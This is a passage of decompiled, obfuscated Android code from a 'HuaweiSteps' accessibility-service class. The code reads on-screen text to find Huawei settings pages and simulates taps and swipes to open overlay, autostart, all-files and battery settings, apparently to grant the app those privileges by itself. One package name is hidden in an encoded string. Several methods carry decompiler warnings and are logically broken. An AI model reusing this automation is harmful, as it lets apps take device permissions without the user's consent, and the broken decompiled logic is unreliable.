                    if (AbstractC0779a1.m213652a5((String) obj, str, false)) {
                        t60.m214704c5("HuaweiSteps", "[isOnAllFilesPage] 找到关键词: ".concat(str));
                        return true;
                    }
                }
            }
        }
        t60.m214704c5("HuaweiSteps", "[isOnAllFilesPage] 未找到所有文件页面关键词");
        return false;
    }

    /* renamed from: e3 */
    public final boolean m212189e3() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m212153e4(rootInActiveWindow, arrayList);
        t60.m214704c5("HuaweiSteps", "[isOnBatteryPage] 页面文本: " + AbstractC0715je.m213301i8(arrayList, 10));
        for (String str : AbstractC0716jf.m213306g5("电池", "性能模式", "省电模式", "剩余电量", "更多电池设置", "電池", "性能模式", "省電模式", "剩餘電量", "更多電池設定")) {
            if (!arrayList.isEmpty()) {
                int size = arrayList.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayList.get(i);
                    i++;
                    if (AbstractC0779a1.m213652a5((String) obj, str, false)) {
                        t60.m214704c5("HuaweiSteps", "[isOnBatteryPage] 找到关键词: ".concat(str));
                        return true;
                    }
                }
            }
        }
        t60.m214704c5("HuaweiSteps", "[isOnBatteryPage] 未找到电池相关关键词");
        return false;
    }

    /* renamed from: e5 */
    public final boolean m212190e5() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m212154e6(rootInActiveWindow, arrayList);
        t60.m214704c5("HuaweiSteps", "[isOnMoreBatterySettingsPage] 页面文本: " + AbstractC0715je.m213301i8(arrayList, 10));
        for (String str : AbstractC0716jf.m213306g5("更多电池设置", "休眠时始终保持网络连接", "充电提示音", "更多電池設定", "休眠時始終保持網絡連接", "充電提示音")) {
            if (!arrayList.isEmpty()) {
                int size = arrayList.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayList.get(i);
                    i++;
                    if (AbstractC0779a1.m213652a5((String) obj, str, false)) {
                        t60.m214704c5("HuaweiSteps", "[isOnMoreBatterySettingsPage] 找到关键词: ".concat(str));
                        return true;
                    }
                }
            }
        }
        t60.m214704c5("HuaweiSteps", "[isOnMoreBatterySettingsPage] 未找到更多电池设置相关关键词");
        return false;
    }

    /* renamed from: e7 */
    public final boolean m212191e7() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m212145a7(rootInActiveWindow, arrayList);
        for (String str : AbstractC0716jf.m213306g5("其他应用", "上层显示", "悬浮", "显示在其他应用", "其他應用程式", "上層顯示", "懸浮", "顯示在其他應用程式")) {
            if (!arrayList.isEmpty()) {
                int size = arrayList.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayList.get(i);
                    i++;
                    if (AbstractC0779a1.m213652a5((String) obj, str, false)) {
                        t60.m214704c5("HuaweiSteps", "[isOnOverlayDetailPage] 找到关键词: ".concat(str));
                        return true;
                    }
                }
            }
        }
        t60.m214704c5("HuaweiSteps", "[isOnOverlayDetailPage] 未找到悬浮窗详情页关键词");
        return false;
    }

    /* renamed from: e8 */
    public final boolean m212192e8() {
        boolean z;
        boolean z2;
        boolean z3;
        boolean z4;
        CharSequence className;
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        CharSequence packageName = rootInActiveWindow.getPackageName();
        String string2 = packageName != null ? packageName.toString() : null;
        if (!t60.m214686a2(string2, "com.android.settings")) {
            tz0.m214807a7("[isOnSettingsPage] ❌ 不是设置包名: ", string2, "HuaweiSteps");
            return false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("设置");
        if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            z = false;
        } else {
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                if (accessibilityNodeInfo.isVisibleToUser()) {
                    CharSequence text = accessibilityNodeInfo.getText();
                    if (t60.m214686a2(text != null ? text.toString() : null, "设置") && (className = accessibilityNodeInfo.getClassName()) != null && (string = className.toString()) != null && AbstractC0779a1.m213652a5(string, "TextView", false)) {
                        z = true;
                        break;
                    }
                }
            }
            z = false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText("向上导航");
        if (listFindAccessibilityNodeInfosByText2 == null || listFindAccessibilityNodeInfosByText2.isEmpty()) {
            z2 = false;
        } else {
            Iterator<T> it = listFindAccessibilityNodeInfosByText2.iterator();
            while (it.hasNext()) {
                if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                    z2 = true;
                    break;
                }
            }
            z2 = false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText("Navigate up");
        if (listFindAccessibilityNodeInfosByText3 == null || listFindAccessibilityNodeInfosByText3.isEmpty()) {
            z3 = false;
        } else {
            Iterator<T> it2 = listFindAccessibilityNodeInfosByText3.iterator();
            while (it2.hasNext()) {
                if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                    z3 = true;
                    break;
                }
            }
            z3 = false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText4 = rootInActiveWindow.findAccessibilityNodeInfosByText("取消");
        if (listFindAccessibilityNodeInfosByText4 == null || listFindAccessibilityNodeInfosByText4.isEmpty()) {
            z4 = false;
        } else {
            Iterator<T> it3 = listFindAccessibilityNodeInfosByText4.iterator();
            while (it3.hasNext()) {
                if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                    z4 = true;
                    break;
                }
            }
            z4 = false;
        }
        t60.m214704c5("HuaweiSteps", "[isOnSettingsPage] 有设置标题: " + z + ", 有向上导航: " + z2 + ", 有NavigateUp: " + z3 + ", 有取消: " + z4);
        if (z2 || z3 || z4) {
            t60.m214704c5("HuaweiSteps", "[isOnSettingsPage] ❌ 不在设置首页");
            return false;
        }
        t60.m214704c5("HuaweiSteps", "[isOnSettingsPage] ✅ 在设置首页");
        return true;
    }

    /* renamed from: f0 */
    public final boolean m212193f0(String str) {
        return ((SharedPreferences) this.f55066a4.getValue()).getBoolean(str, false);
    }

    /* renamed from: f1 */
    public final void m212194f1() throws InterruptedException {
        t60.m214704c5("HuaweiSteps", "[权限] 启动权限请求Activity...");
        CountDownLatch countDownLatch = new CountDownLatch(1);
        new Handler(Looper.getMainLooper()).post(new RunnableC1052p1(this, 9, countDownLatch));
        try {
            countDownLatch.await(3L, TimeUnit.SECONDS);
        } catch (Exception unused) {
        }
    }

    /* renamed from: f2 */
    public final void m212195f2(String str) {
        ((SharedPreferences) this.f55066a4.getValue()).edit().putBoolean(str, true).apply();
        t60.m214704c5("HuaweiSteps", "[子步骤] 标记完成: " + str);
    }

    /* renamed from: f3 */
    public final boolean m212196f3() {
        for (Pair pair : AbstractC0716jf.m213306g5(new Pair(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"), new Pair("com.hihonor.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"), new Pair("com.hihonor.systemmanager", "com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity"), new Pair(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))) {
            String str = (String) pair.f57556a0;
            String str2 = (String) pair.f57557a1;
            try {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(str, str2));
                intent.setFlags(276824064);
                this.f55063a1.startActivity(intent);
                t60.m214704c5("HuaweiSteps", "[自启动] 直接打开: " + str + "/" + str2);
                return true;
            } catch (Exception e) {
                String message = e.getMessage();
                StringBuilder sbM41c2 = AbstractC0003a2.m41c2("[自启动] 打开失败: ", str, "/", str2, " - ");
                sbM41c2.append(message);
                t60.m214704c5("HuaweiSteps", sbM41c2.toString());
            }
        }
        return false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:115:0x02ca, code lost:
    
        if (r0.m212215h3(800, r2) == r3) goto L116;
     */
    /* JADX WARN: Code restructure failed: missing block: B:29:0x00ed, code lost:
    
        if (p000.b81.m210571b1(500, r2) != r3) goto L31;
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x010a, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L116;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x0179, code lost:
    
        if (r13.m212215h3(800, r2) == r3) goto L116;
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x01e4, code lost:
    
        if (r12.m212215h3(500, r2) == r3) goto L116;
     */
    /* JADX WARN: Removed duplicated region for block: B:114:0x02b5  */
    /* JADX WARN: Removed duplicated region for block: B:125:0x02eb  */
    /* JADX WARN: Removed duplicated region for block: B:131:0x030c  */
    /* JADX WARN: Removed duplicated region for block: B:34:0x00fb  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x0110  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x0128  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x0165  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:81:0x01f7  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:115:0x02ca -> B:117:0x02cd). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:125:0x02eb -> B:123:0x02e3). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:129:0x02f9 -> B:130:0x0305). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:35:0x010a -> B:37:0x010e). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:69:0x019d -> B:57:0x0162). Please report as a decompilation issue!!! */
    /* renamed from: f4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212197f4(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$openSettingsWithVerify$1 huaweiSteps$openSettingsWithVerify$1;
        C0365a2 c0365a2;
        int i;
        C0365a2 c0365a22;
        C0365a2 c0365a23;
        int i2;
        int i3;
        int i4;
        C0365a2 c0365a24;
        int i5;
        C0365a2 c0365a25;
        int i6;
        int i7;
        int i8;
        C0365a2 c0365a26;
        if (continuationImpl instanceof HuaweiSteps$openSettingsWithVerify$1) {
            huaweiSteps$openSettingsWithVerify$1 = (HuaweiSteps$openSettingsWithVerify$1) continuationImpl;
            int i9 = huaweiSteps$openSettingsWithVerify$1.f54099a5;
            if ((i9 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$openSettingsWithVerify$1.f54099a5 = i9 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$openSettingsWithVerify$1 = new HuaweiSteps$openSettingsWithVerify$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$openSettingsWithVerify$1.f54097a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        long j = 1500;
        int i10 = 1350631424;
        switch (huaweiSteps$openSettingsWithVerify$1.f54099a5) {
            case 0:
                kg1.m213544f4(obj);
                if (((Boolean) this.f55080b8.getValue()).booleanValue()) {
                    t60.m214704c5("HuaweiSteps", "[openSettings] 📱 折叠屏设备，特殊处理");
                    try {
                        Intent intent = new Intent("android.settings.SETTINGS");
                        intent.setFlags(1350631424);
                        this.f55062a0.startActivity(intent);
                        t60.m214704c5("HuaweiSteps", "[openSettings] 已发送打开设置Intent");
                        huaweiSteps$openSettingsWithVerify$1.f54094a0 = this;
                        huaweiSteps$openSettingsWithVerify$1.f54099a5 = 1;
                        if (m212215h3(1500L, huaweiSteps$openSettingsWithVerify$1) != coroutineSingletons) {
                            c0365a22 = this;
                            float fM212181d5 = c0365a22.m212181d5() * 0.4f;
                            float fM212180d4 = c0365a22.m212180d4() * 0.5f;
                            t60.m214704c5("HuaweiSteps", AbstractC0003a2.m29b0("[openSettings] 📱 折叠屏：点击左侧区域切换焦点 (", fM212181d5, ", ", fM212180d4, ")"));
                            c0365a22.m212202f9(fM212181d5, fM212180d4);
                            huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a22;
                            huaweiSteps$openSettingsWithVerify$1.f54099a5 = 2;
                            break;
                        }
                        return coroutineSingletons;
                    } catch (Exception e) {
                        tz0.m214807a7("[openSettings] ❌ 打开设置失败: ", e.getMessage(), "HuaweiSteps");
                        return Boolean.FALSE;
                    }
                }
                c0365a2 = this;
                i = 0;
                if (i < 3) {
                    t60.m214704c5("HuaweiSteps", "[openSettings] ❌ 3次尝试均失败");
                    return Boolean.FALSE;
                }
                t60.m214704c5("HuaweiSteps", "[openSettings] 第" + (i + 1) + "次尝试打开设置");
                boolean zM212186e0 = c0365a2.m212186e0();
                boolean zM212192e8 = zM212186e0 ? c0365a2.m212192e8() : false;
                if (zM212186e0 && zM212192e8) {
                    t60.m214704c5("HuaweiSteps", "[openSettings] ✅ 已经在设置首页");
                    huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a2;
                    huaweiSteps$openSettingsWithVerify$1.f54095a1 = i;
                    i5 = 6;
                    huaweiSteps$openSettingsWithVerify$1.f54099a5 = 6;
                } else {
                    if (!zM212186e0 || zM212192e8) {
                        try {
                        } catch (Exception e2) {
                            tz0.m214807a7("[openSettings] ❌ 打开设置失败: ", e2.getMessage(), "HuaweiSteps");
                            break;
                        }
                        Intent intent2 = new Intent("android.settings.SETTINGS");
                        intent2.setFlags(i10);
                        c0365a2.f55062a0.startActivity(intent2);
                        t60.m214704c5("HuaweiSteps", "[openSettings] 已发送打开设置Intent");
                        huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a2;
                        huaweiSteps$openSettingsWithVerify$1.f54095a1 = i;
                        huaweiSteps$openSettingsWithVerify$1.f54099a5 = 5;
                        if (c0365a2.m212215h3(1500L, huaweiSteps$openSettingsWithVerify$1) != coroutineSingletons) {
                            huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a2;
                            huaweiSteps$openSettingsWithVerify$1.f54095a1 = i;
                            i5 = 6;
                            huaweiSteps$openSettingsWithVerify$1.f54099a5 = 6;
                            break;
                        }
                        return coroutineSingletons;
                    }
                    t60.m214704c5("HuaweiSteps", "[openSettings] ⚠️ 当前在设置子页面，开始返回...");
                    c0365a24 = c0365a2;
                    i4 = i;
                    i3 = 1;
                    if (i3 < 6) {
                        c0365a24.f55063a1.performGlobalAction(1);
                        huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a24;
                        huaweiSteps$openSettingsWithVerify$1.f54095a1 = i4;
                        huaweiSteps$openSettingsWithVerify$1.f54096a2 = i3;
                        huaweiSteps$openSettingsWithVerify$1.f54099a5 = 4;
                        break;
                    }
                    i = i4;
                    c0365a2 = c0365a24;
                    huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a2;
                    huaweiSteps$openSettingsWithVerify$1.f54095a1 = i;
                    i5 = 6;
                    huaweiSteps$openSettingsWithVerify$1.f54099a5 = 6;
                }
            case 1:
                c0365a22 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                float fM212181d52 = c0365a22.m212181d5() * 0.4f;
                float fM212180d42 = c0365a22.m212180d4() * 0.5f;
                t60.m214704c5("HuaweiSteps", AbstractC0003a2.m29b0("[openSettings] 📱 折叠屏：点击左侧区域切换焦点 (", fM212181d52, ", ", fM212180d42, ")"));
                c0365a22.m212202f9(fM212181d52, fM212180d42);
                huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a22;
                huaweiSteps$openSettingsWithVerify$1.f54099a5 = 2;
                break;
            case 2:
                c0365a22 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                t60.m214704c5("HuaweiSteps", "[openSettings] 📱 折叠屏：下滑2次到顶部");
                c0365a23 = c0365a22;
                i2 = 1;
                if (i2 < 3) {
                    t60.m214704c5("HuaweiSteps", "[openSettings] ✅ 折叠屏：已准备就绪");
                    return Boolean.TRUE;
                }
                c0365a23.m212205g2();
                huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a23;
                huaweiSteps$openSettingsWithVerify$1.f54095a1 = i2;
                huaweiSteps$openSettingsWithVerify$1.f54099a5 = 3;
                break;
            case 3:
                i2 = huaweiSteps$openSettingsWithVerify$1.f54095a1;
                c0365a23 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                i2++;
                if (i2 < 3) {
                }
                break;
            case 4:
                i3 = huaweiSteps$openSettingsWithVerify$1.f54096a2;
                i4 = huaweiSteps$openSettingsWithVerify$1.f54095a1;
                c0365a24 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                if (c0365a24.m212192e8()) {
                    tz0.m214806a6("[openSettings] ✅ 返回", i3, "次后到达设置首页", "HuaweiSteps");
                } else if (c0365a24.m212186e0()) {
                    t60.m214704c5("HuaweiSteps", "[openSettings] 返回" + i3 + "次，还在子页面，继续返回...");
                    i3++;
                    if (i3 < 6) {
                    }
                } else {
                    tz0.m214806a6("[openSettings] ⚠️ 返回", i3, "次后退出设置，需要重新打开", "HuaweiSteps");
                }
                i = i4;
                c0365a2 = c0365a24;
                huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a2;
                huaweiSteps$openSettingsWithVerify$1.f54095a1 = i;
                i5 = 6;
                huaweiSteps$openSettingsWithVerify$1.f54099a5 = 6;
                break;
            case 5:
                i = huaweiSteps$openSettingsWithVerify$1.f54095a1;
                c0365a2 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a2;
                huaweiSteps$openSettingsWithVerify$1.f54095a1 = i;
                i5 = 6;
                huaweiSteps$openSettingsWithVerify$1.f54099a5 = 6;
                break;
            case 6:
                i = huaweiSteps$openSettingsWithVerify$1.f54095a1;
                c0365a2 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                i5 = 6;
                if (c0365a2.m212192e8()) {
                    t60.m214704c5("HuaweiSteps", "[openSettings] ✅ 确认在设置首页");
                    i6 = 1;
                    c0365a25 = c0365a2;
                    while (i6 < i5) {
                        AccessibilityNodeInfo rootInActiveWindow = c0365a25.f55063a1.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                            String[] strArr = {"WLAN", "Wi-Fi", "蓝牙", "Bluetooth", "移动网络", "Mobile network", "更多连接", "More connections", "搜索设置项", "Search settings", "无线和网络", "超级终端", "设备连接", "华为账号", "桌面和壁纸"};
                            for (int i11 = 0; i11 < 15; i11++) {
                                String str = strArr[i11];
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                    Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                    while (it.hasNext()) {
                                        if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                            t60.m214704c5("HuaweiSteps", "[isAtSettingsTop] ✅ 在顶部，找到: " + str);
                                            t60.m214704c5("HuaweiSteps", "[openSettings] ✅ 已在顶部");
                                            return Boolean.TRUE;
                                        }
                                    }
                                }
                            }
                            t60.m214704c5("HuaweiSteps", "[isAtSettingsTop] ❌ 不在顶部");
                        }
                        t60.m214704c5("HuaweiSteps", "[openSettings] 不在顶部，下滑第" + i6 + "次");
                        c0365a25.m212205g2();
                        huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a25;
                        huaweiSteps$openSettingsWithVerify$1.f54095a1 = i6;
                        huaweiSteps$openSettingsWithVerify$1.f54099a5 = 7;
                        if (b81.m210571b1(100L, huaweiSteps$openSettingsWithVerify$1) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        i6++;
                    }
                    return Boolean.TRUE;
                }
                if (!c0365a2.m212186e0() || c0365a2.m212192e8()) {
                    tz0.m214806a6("[openSettings] 第", i + 1, "次未成功，重试...", "HuaweiSteps");
                    i++;
                    i10 = 1350631424;
                    j = 1500;
                    if (i < 3) {
                    }
                } else {
                    t60.m214704c5("HuaweiSteps", "[openSettings] ⚠️ 仍在子页面，继续返回...");
                    c0365a26 = c0365a2;
                    i7 = i;
                    i8 = 1;
                    if (i8 >= 4) {
                        c0365a26.f55063a1.performGlobalAction(1);
                        huaweiSteps$openSettingsWithVerify$1.f54094a0 = c0365a26;
                        huaweiSteps$openSettingsWithVerify$1.f54095a1 = i7;
                        huaweiSteps$openSettingsWithVerify$1.f54096a2 = i8;
                        huaweiSteps$openSettingsWithVerify$1.f54099a5 = 8;
                        break;
                    } else {
                        i = i7;
                        c0365a2 = c0365a26;
                        tz0.m214806a6("[openSettings] 第", i + 1, "次未成功，重试...", "HuaweiSteps");
                        i++;
                        i10 = 1350631424;
                        j = 1500;
                        if (i < 3) {
                        }
                    }
                }
                break;
            case 7:
                int i12 = huaweiSteps$openSettingsWithVerify$1.f54095a1;
                c0365a25 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                i5 = 6;
                i6 = i12 + 1;
                while (i6 < i5) {
                }
                return Boolean.TRUE;
            case 8:
                i8 = huaweiSteps$openSettingsWithVerify$1.f54096a2;
                i7 = huaweiSteps$openSettingsWithVerify$1.f54095a1;
                C0365a2 c0365a27 = huaweiSteps$openSettingsWithVerify$1.f54094a0;
                kg1.m213544f4(obj);
                c0365a26 = c0365a27;
                if (c0365a26.m212192e8()) {
                    tz0.m214806a6("[openSettings] ✅ 额外返回", i8, "次后到达首页", "HuaweiSteps");
                    return Boolean.TRUE;
                }
                if (c0365a26.m212186e0()) {
                    i8++;
                    if (i8 >= 4) {
                    }
                }
                i = i7;
                c0365a2 = c0365a26;
                tz0.m214806a6("[openSettings] 第", i + 1, "次未成功，重试...", "HuaweiSteps");
                i++;
                i10 = 1350631424;
                j = 1500;
                if (i < 3) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* renamed from: f5 */
    public final boolean m212198f5(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
            SystemClock.sleep(150L);
            return true;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        for (int i = 0; i < 10 && parent != null; i++) {
            if (parent.isClickable() && parent.performAction(16)) {
                SystemClock.sleep(150L);
                return true;
            }
            parent = parent.getParent();
        }
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        if (rectM24a5.width() <= 0 || rectM24a5.height() <= 0) {
            return false;
        }
        float fCenterX = rectM24a5.centerX();
        float fCenterY = rectM24a5.centerY();
        t60.m214704c5("HuaweiSteps", AbstractC0003a2.m29b0("[performClick] 使用坐标点击: (", fCenterX, ", ", fCenterY, ")"));
        Path path = new Path();
        path.moveTo(fCenterX, fCenterY);
        GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 50L)).build();
        SystemClock.sleep(50L);
        CountDownLatch countDownLatch = new CountDownLatch(1);
        Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
        boolean zDispatchGesture = this.f55063a1.dispatchGesture(gestureDescriptionBuild, new k40(ref$BooleanRef, countDownLatch, fCenterX, fCenterY), null);
        if (zDispatchGesture) {
            try {
                countDownLatch.await(500L, TimeUnit.MILLISECONDS);
            } catch (Exception e) {
                tz0.m214807a7("[performClick] 等待超时: ", e.getMessage(), "HuaweiSteps");
            }
        }
        SystemClock.sleep(100L);
        return ref$BooleanRef.f57622a0 || zDispatchGesture;
    }

    /* JADX WARN: Removed duplicated region for block: B:16:0x0047  */
    /* JADX WARN: Removed duplicated region for block: B:20:0x0084  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:17:0x007f -> B:19:0x0082). Please report as a decompilation issue!!! */
    /* renamed from: f6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212199f6(int i, int i2, int i3, ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$performGestureClick$1 huaweiSteps$performGestureClick$1;
        int i4;
        int i5;
        int i6;
        int i7;
        C0365a2 c0365a2;
        if (continuationImpl instanceof HuaweiSteps$performGestureClick$1) {
            huaweiSteps$performGestureClick$1 = (HuaweiSteps$performGestureClick$1) continuationImpl;
            int i8 = huaweiSteps$performGestureClick$1.f54107a7;
            if ((i8 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$performGestureClick$1.f54107a7 = i8 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$performGestureClick$1 = new HuaweiSteps$performGestureClick$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$performGestureClick$1.f54105a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i9 = huaweiSteps$performGestureClick$1.f54107a7;
        if (i9 == 0) {
            kg1.m213544f4(obj);
            i4 = i;
            i5 = 0;
            i6 = i3;
            i7 = i2;
            c0365a2 = this;
            if (i5 < i6) {
            }
        } else {
            if (i9 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i5 = huaweiSteps$performGestureClick$1.f54104a4;
            int i10 = huaweiSteps$performGestureClick$1.f54103a3;
            i7 = huaweiSteps$performGestureClick$1.f54102a2;
            int i11 = huaweiSteps$performGestureClick$1.f54101a1;
            c0365a2 = huaweiSteps$performGestureClick$1.f54100a0;
            kg1.m213544f4(obj);
            i6 = i10;
            i4 = i11;
            i5++;
            if (i5 < i6) {
                Path path = new Path();
                path.moveTo(i4, i7);
                c0365a2.f55063a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L)).build(), null, null);
                huaweiSteps$performGestureClick$1.f54100a0 = c0365a2;
                huaweiSteps$performGestureClick$1.f54101a1 = i4;
                huaweiSteps$performGestureClick$1.f54102a2 = i7;
                huaweiSteps$performGestureClick$1.f54103a3 = i6;
                huaweiSteps$performGestureClick$1.f54104a4 = i5;
                huaweiSteps$performGestureClick$1.f54107a7 = 1;
                if (b81.m210571b1(100L, huaweiSteps$performGestureClick$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                i5++;
                if (i5 < i6) {
                    return C1351vv.f60710b1;
                }
            }
        }
    }

    /* renamed from: f7 */
    public final void m212200f7(float f, float f2) {
        try {
            Path path = new Path();
            path.moveTo(f, f2);
            this.f55063a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build(), null, null);
            t60.m214704c5("HuaweiSteps", "[手势] 点击坐标: (" + f + ", " + f2 + ")");
        } catch (Exception e) {
            tz0.m214807a7("[手势] 失败: ", e.getMessage(), "HuaweiSteps");
        }
    }

    /* renamed from: f8 */
    public final void m212201f8() {
        try {
            float fM212181d5 = m212181d5() * 0.85f;
            float fM212181d52 = m212181d5() * 0.15f;
            float fM212180d4 = m212180d4() * 0.45f;
            t60.m214704c5("HuaweiSteps", "[横向滑动] 华为: (" + fM212181d5 + ", " + fM212180d4 + ") -> (" + fM212181d52 + ", " + fM212180d4 + "), 时长=400ms");
            Path path = new Path();
            path.moveTo(fM212181d5, fM212180d4);
            path.lineTo(fM212181d52, fM212180d4);
            this.f55063a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 400L)).build(), new C0429du(3), null);
        } catch (Exception e) {
            tz0.m214807a7("[横向滑动] 失败: ", e.getMessage(), "HuaweiSteps");
        }
    }

    /* renamed from: f9 */
    public final void m212202f9(float f, float f2) throws InterruptedException {
        Path path = new Path();
        path.moveTo(f, f2);
        GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build();
        CountDownLatch countDownLatch = new CountDownLatch(1);
        if (!this.f55063a1.dispatchGesture(gestureDescriptionBuild, new l40(countDownLatch, f, f2), null)) {
            t60.m214726f4("HuaweiSteps", AbstractC0003a2.m29b0("[performSingleClick] dispatchGesture返回false: (", f, ", ", f2, ")"));
            return;
        }
        try {
            countDownLatch.await(500L, TimeUnit.MILLISECONDS);
        } catch (Exception e) {
            tz0.m214807a7("[performSingleClick] 等待超时: ", e.getMessage(), "HuaweiSteps");
        }
    }

    /* renamed from: g0 */
    public final Object m212203g0(float f, float f2, float f3, InterfaceC0876mv interfaceC0876mv) {
        C0530gb c0530gb = new C0530gb(1, kj1.m213575c2(interfaceC0876mv));
        c0530gb.m212926b6();
        Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
        Path path = new Path();
        path.moveTo(f, f2);
        path.lineTo(f, f3);
        GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 500L)).build();
        Handler handler = new Handler(Looper.getMainLooper());
        RunnableC0884n2 runnableC0884n2 = new RunnableC0884n2(ref$BooleanRef, c0530gb, 7, false);
